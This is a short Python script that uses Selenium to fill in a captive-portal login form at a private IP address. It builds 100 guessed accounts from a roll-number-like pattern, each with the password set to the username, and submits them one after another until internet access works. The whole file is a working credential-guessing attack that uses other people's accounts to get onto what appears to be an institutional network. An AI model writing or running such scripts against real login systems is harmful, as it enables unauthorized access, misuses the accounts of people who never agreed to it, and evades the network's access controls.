#!/usr/bin/python
#deal with SSLError -->connection private
#deal with ConnectionError --> failed to establish connection
import requests,sys
from selenium import webdriver
url='http://172.16.2.1:1000/login?'
flag=0
lisdic=[]
s='14BCS14'
for i in range(100):
	lisdic.append({'username':s+str('%02d'%(i)),'password':s+str('%02d'%(i))})
browser=webdriver.Chrome()
print 'Connecting...'
browser.get(url)
try:
	rs=requests.get('http://www.google.com')
	print 'Already Connected'
	raise SystemExit
except Exception as err:
	print err
	print 'Trying more hold on'
	for i in range(1,100):
		browser.get(url)
		user=browser.find_element_by_name('username')
		user.send_keys(lisdic[i]['username'])
		print lisdic[i]['username']
		passw=browser.find_element_by_name('password')
		passw.send_keys(lisdic[i]['password'])
		print lisdic[i]['password']
		passw.submit()
		try:
			rs=requests.get('http://www.google.com')
			flag=1
			print 'Enjoy one click login'
			break;
		except:
			continue;

if flag==0:
	print 'None key worked'